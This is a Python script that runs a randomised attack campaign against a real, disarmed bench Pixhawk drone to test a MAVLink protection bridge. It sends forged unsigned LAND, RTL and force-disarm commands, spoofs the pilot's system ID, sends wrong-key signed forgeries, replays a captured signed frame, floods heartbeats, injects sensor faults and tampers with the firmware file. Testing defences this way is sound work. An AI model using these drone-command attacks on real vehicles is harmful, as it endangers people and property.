"""Randomised, overlapping attack campaign against the REAL Pixhawk, through the ips-bridge + px_fc_proxy.py + LR900 radio.

Adapted from scripts/ardupilot/inline_demo/pi/campaign.py for a real, DISARMED, propeller-less bench vehicle: no arm, no takeoff,
no GPS-glitch event (SIM only). Ground truth is the vehicle's own flight-mode changes (from its real heartbeat) plus the bridge's
own counters -- never alert counts, which the known GPS false-alarm issue would pollute.

Events (10, shuffled by the seed; two adjacent pairs overlap): forged_land, forged_force_disarm, forged_rtl_spoof255,
wrong_key_land (SIGNED link) / spoof255_land (UNSIGNED link), replay, flood, alt_bias, batt_jump, freeze, fw_tamper.
fw_tamper and alt_bias/batt_jump/freeze act through SSH on the Pi (firmware directory / px_fc_proxy.py's control port).

usage: px_campaign.py LABEL LINK(signed|unsigned) SEED HUB_HOST:PORT SSH_KEY PI_HOST PROXY_PORT [--key KEYFILE] [--wrongkey KEYFILE]
Writes px_campaign_<label>.json. Aborts immediately (no cleanup attack, no further events) if the vehicle ever reports armed."""

import json
import os
import random
import subprocess
import sys
import time

os.environ["MAVLINK20"] = "1"
from pymavlink import mavutil  # noqa: E402

label, link, seed, hub_addr, ssh_key, pi_host, proxy_port = sys.argv[1:8]
seed = int(seed)
SIGNED = link == "signed"
KEY = open(sys.argv[sys.argv.index("--key") + 1], "rb").read() if "--key" in sys.argv else None
WRONG = (
    open(sys.argv[sys.argv.index("--wrongkey") + 1], "rb").read()
    if "--wrongkey" in sys.argv
    else None
)
if SIGNED and (KEY is None or WRONG is None):
    sys.exit("signed-link campaign needs --key and --wrongkey")
rng = random.Random(seed)
HUB = f"tcp:{hub_addr}"
NAMES = {0: "STABILIZE", 2: "ALT_HOLD", 5: "LOITER", 6: "RTL", 9: "LAND", 4: "GUIDED", 3: "AUTO"}


def conn(sysid, key=None):
    c = mavutil.mavlink_connection(HUB, source_system=sysid, source_component=190)
    if key is not None:
        c.setup_signing(key, sign_outgoing=True, allow_unsigned_callback=lambda *a: True, link_id=1)
    return c


pilot = conn(255, KEY if SIGNED else None)
a66 = conn(66)  # unknown attacker, always unsigned
a255 = conn(255)  # spoofs the pilot's identity, own counter, always unsigned
wrong = conn(255, WRONG) if SIGNED else None  # wrong-key signed forgery (signed link only)

hb = None
t0 = time.time()
while time.time() - t0 < 30 and hb is None:
    pilot.mav.heartbeat_send(
        mavutil.mavlink.MAV_TYPE_GCS, mavutil.mavlink.MAV_AUTOPILOT_INVALID, 0, 0, 0
    )
    x = pilot.recv_match(type="HEARTBEAT", blocking=True, timeout=1)
    if x is not None and x.get_srcSystem() == 1 and x.get_srcComponent() == 1:
        hb = x
if hb is None:
    sys.exit("no heartbeat from the vehicle over the radio")
if hb.base_mode & 128:
    sys.exit("ABORT: vehicle reports ARMED before the campaign started")
for sid, hz in (
    (mavutil.mavlink.MAV_DATA_STREAM_EXTENDED_STATUS, 1),
    (mavutil.mavlink.MAV_DATA_STREAM_POSITION, 1),
    (mavutil.mavlink.MAV_DATA_STREAM_EXTRA1, 1),
    (mavutil.mavlink.MAV_DATA_STREAM_EXTRA2, 1),
):
    pilot.mav.request_data_stream_send(1, 1, sid, hz, 1)
    time.sleep(0.3)

st = {
    "mode": hb.custom_mode,
    "armed": bool(hb.base_mode & 128),
}  # seed from the real heartbeat already received above
last_hb = [0.0]
texts, acks, mode_log = [], [], []
t0 = time.time()


def now():
    return round(time.time() - t0, 1)


def pump(sec):
    end = time.time() + sec
    while time.time() < end:
        for c in (a66, a255) + ((wrong,) if wrong is not None else ()):
            while c.recv_match(blocking=False) is not None:
                pass
        if time.time() - last_hb[0] >= 1.0:
            pilot.mav.heartbeat_send(
                mavutil.mavlink.MAV_TYPE_GCS, mavutil.mavlink.MAV_AUTOPILOT_INVALID, 0, 0, 0
            )
            last_hb[0] = time.time()
        x = pilot.recv_match(blocking=True, timeout=0.2)
        if x is None:
            continue
        t = x.get_type()
        if t == "HEARTBEAT" and x.get_srcSystem() == 1 and x.get_srcComponent() == 1:
            if st["mode"] != x.custom_mode:
                mode_log.append((now(), NAMES.get(x.custom_mode, x.custom_mode)))
            st["mode"], st["armed"] = x.custom_mode, bool(x.base_mode & 128)
            if st["armed"]:
                raise SystemExit(f"ABORT: vehicle reports ARMED at t={now()}")
        elif t == "STATUSTEXT":
            texts.append((now(), x.get_srcSystem(), x.text))
        elif t == "COMMAND_ACK":
            acks.append((now(), x.command, x.result))


def mode_name():
    return NAMES.get(st["mode"], st["mode"])


def status():
    # the bridge's --status-port binds 127.0.0.1 only by default (not reachable from the laptop over the network,
    # and deliberately so: it would otherwise expose the bridge's status/control API unauthenticated on the LAN) --
    # fetch it the same way as every other Pi-side action in this driver, over ssh, not a direct HTTP request.
    try:
        r = subprocess.run(
            [
                "ssh",
                "-i",
                ssh_key,
                "-o",
                "BatchMode=yes",
                "-o",
                "ConnectTimeout=5",
                pi_host,
                "curl -s --max-time 3 http://127.0.0.1:8090/status",
            ],
            check=False,
            timeout=10,
            capture_output=True,
            text=True,
        )
        return json.loads(r.stdout)
    except Exception as e:  # noqa: BLE001
        return {"error": str(e)}


def snap():
    s = status()
    if "error" in s:
        return s
    p, f, an = s.get("policy", {}), s.get("frames", {}), s.get("analyser", {})
    return {
        "t": now(),
        "dropped_up": f.get("dropped_up"),
        "dropped_down": f.get("dropped_down"),
        "forwarded_up": f.get("forwarded_up"),
        "rewritten": p.get("rewritten"),
        "mode": s.get("mode"),
        "counter_frames": an.get("counter_frames_sent"),
        "drops": {
            k: v for k, v in p.items() if k.startswith("dropped") and isinstance(v, int) and v
        },
    }


def ssh(cmd, timeout=40):
    subprocess.run(
        ["ssh", "-i", ssh_key, "-o", "BatchMode=yes", pi_host, cmd],
        check=False,
        timeout=timeout,
        capture_output=True,
    )


def proxy_ctl(cmd):
    ssh(
        f"~/aegis_test/venv/bin/python ~/aegis_test/scripts/ardupilot/real_pixhawk/px_proxy_ctl.py {proxy_port} {cmd}"
    )


def capture_and_send(c, command, p1=0.0, p2=0.0):
    """Send a real COMMAND_LONG through the pilot's own connection (correct seq, real signature/timestamp if signed) and
    return the EXACT bytes written to the wire -- a genuine previously-transmitted frame, for a true replay attack."""
    captured = {}
    orig_write = c.write

    def spy(buf):
        captured["raw"] = bytes(buf)
        return orig_write(buf)

    c.write = spy
    c.mav.command_long_send(1, 1, command, 0, p1, p2, 0, 0, 0, 0, 0)
    c.write = orig_write
    return captured.get("raw")


cap = {}


def capture_replay():
    cap["raw"] = capture_and_send(
        pilot, 176, 1, 2
    )  # ALT_HOLD, a genuinely-sent signed/unsigned frame for the replay event
    pump(3)
    pilot.mav.command_long_send(1, 1, 176, 0, 1, 0, 0, 0, 0, 0, 0)  # back to STABILIZE
    pump(3)


print(f"start: mode {mode_name()} armed {st['armed']}", flush=True)
capture_replay()
print("captured a legitimate signed SET_MODE ALT_HOLD for the replay event", flush=True)

EV = [
    "forged_land",
    "forged_force_disarm",
    "forged_rtl_spoof255",
    "wrong_key_land" if SIGNED else "spoof255_land",
    "replay",
    "flood",
    "alt_bias",
    "batt_jump",
    "freeze",
    "fw_tamper",
]
rng.shuffle(EV)
gaps = [rng.uniform(25, 35) for _ in EV]
for i in rng.sample(range(1, len(EV)), 2):
    gaps[i] = rng.uniform(4, 8)
sched = []
at = 10.0
for ev, g in zip(EV, gaps, strict=True):
    at += g
    sched.append((round(at, 1), ev))
DUR = {"flood": 6, "alt_bias": 10, "batt_jump": 10, "freeze": 10, "fw_tamper": 15}
print("schedule", sched, flush=True)


def start_event(ev):
    if ev == "forged_land":
        for _ in range(3):
            a66.mav.command_long_send(
                1, 1, 21, 0, 0, 0, 0, 0, 0, 0, 0
            )  # NAV_LAND, unsigned, sysid 66
    elif ev == "forged_force_disarm":
        for _ in range(3):
            a66.mav.command_long_send(1, 1, 400, 0, 0, 21196, 0, 0, 0, 0, 0)
    elif ev == "forged_rtl_spoof255":
        for _ in range(3):
            a255.mav.command_long_send(
                1, 1, 20, 0, 0, 0, 0, 0, 0, 0, 0
            )  # RTL, unsigned, sysid 255 (spoofing the pilot)
    elif ev == "spoof255_land":
        for _ in range(3):
            a255.mav.command_long_send(1, 1, 21, 0, 0, 0, 0, 0, 0, 0, 0)
    elif ev == "wrong_key_land":
        for _ in range(3):
            wrong.mav.command_long_send(
                1, 1, 21, 0, 0, 0, 0, 0, 0, 0, 0
            )  # signed with the WRONG key
    elif ev == "replay":
        a66.write(cap["raw"])
        a66.write(cap["raw"])
    elif ev == "flood":
        n = 0
        tt = time.time()
        while time.time() - tt < DUR["flood"]:
            a66.mav.heartbeat_send(
                mavutil.mavlink.MAV_TYPE_QUADROTOR,
                mavutil.mavlink.MAV_AUTOPILOT_ARDUPILOTMEGA,
                81,
                0,
                3,
            )
            n += 1
            pump(max(0.0, tt + n / 60.0 - time.time()))
        print("   flood frames written:", n, flush=True)
    elif ev == "alt_bias":
        proxy_ctl("alt_bias 40")
    elif ev == "batt_jump":
        proxy_ctl("batt_jump 3")
    elif ev == "freeze":
        proxy_ctl("freeze")
    elif ev == "fw_tamper":
        ssh(
            "python3 -c \"p='/home/ardra2/aegis_fw/autopilot.bin';b=bytearray(open(p,'rb').read());"
            "b[5000]^=0xFF;open(p,'wb').write(bytes(b))\""
        )


def stop_event(ev):
    if ev in ("alt_bias", "batt_jump", "freeze"):
        proxy_ctl("off")
    elif ev == "fw_tamper":
        ssh("cp /home/ardra2/aegis_fw_orig/autopilot.bin /home/ardra2/aegis_fw/autopilot.bin")


results = []
active = []
tstart = time.time()
i = 0
end_all = sched[-1][0] + 40
while time.time() - tstart < end_all:
    t_now = time.time() - tstart
    if i < len(sched) and t_now >= sched[i][0]:
        ev = sched[i][1]
        i += 1
        rec = {"event": ev, "t_start": now(), "before": snap(), "mode_before": mode_name()}
        start_event(ev)
        rec["after_trigger"] = snap()
        active.append((time.time() + DUR.get(ev, 0), ev, rec))
        results.append(rec)
        print(f"{rec['t_start']:6.1f} start {ev}", flush=True)
    for item in list(active):
        if time.time() >= item[0] and not item[2].get("stopped"):
            stop_event(item[1])
            item[2]["stopped"] = now()
        if time.time() >= item[0] + 10 and "final" not in item[2]:
            item[2]["final"] = snap()
            item[2]["mode_after"] = mode_name()
            item[2]["armed_after"] = st["armed"]
            active.remove(item)
    pump(0.5)
# put the vehicle back to STABILIZE at the end, signed/unsigned as the pilot's own link
pilot.mav.command_long_send(1, 1, 176, 0, 1, 0, 0, 0, 0, 0, 0)
pump(4)

out = {
    "label": label,
    "link": link,
    "seed": seed,
    "schedule": sched,
    "events": results,
    "mode_log": mode_log,
    "final_mode": mode_name(),
    "final_armed": st["armed"],
    "final_snap": snap(),
    "aegis_texts": [(t, x) for t, s, x in texts if str(x).startswith("AEGIS")],
    "t0": t0,
}
json.dump(out, open(f"C:/afsitl/px_campaign_{label}.json", "w"), default=str)
print(f"RESULT: final mode {mode_name()} armed {st['armed']}", flush=True)
